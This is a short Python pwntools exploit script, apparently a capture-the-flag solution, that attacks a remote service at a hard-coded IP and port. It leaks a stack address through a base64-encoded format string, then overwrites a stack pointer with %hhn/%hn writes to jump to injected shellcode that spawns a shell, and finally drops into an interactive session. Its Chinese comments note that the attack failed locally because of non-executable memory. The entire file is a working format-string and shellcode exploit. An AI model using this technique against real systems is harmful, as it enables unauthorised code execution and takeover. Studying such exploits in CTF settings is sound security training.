from base64 import b64encode
from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/test_patch')

# p = process('../file/test_patch')
p = remote('61.147.171.105', '58230')

buf_addr = 0x804a0a0
shellcode = asm(shellcraft.sh())

pause()

payload = b64encode(b'%4$p')
p.sendline(payload)
p.recvuntil(b'0x')

target_address = int(p.recvuntil(b'\n', drop=True), 16) + 4

# 由于字符串存在非栈区，因此只能修改栈中已经存在的地址的值
# 在本地测试失败，因为最新的ubuntu系统会将shellcode对应的地址段设定为不可执行
payload = b64encode(
    shellcode + b'%' + str((target_address & 0xff) - len(shellcode)).encode() + b'c%4$hhn' + \
    b'%' + str((buf_addr & 0xffff) - (target_address & 0xff)).encode() + b'c%12$hn'
)
p.sendline(payload)

p.interactive()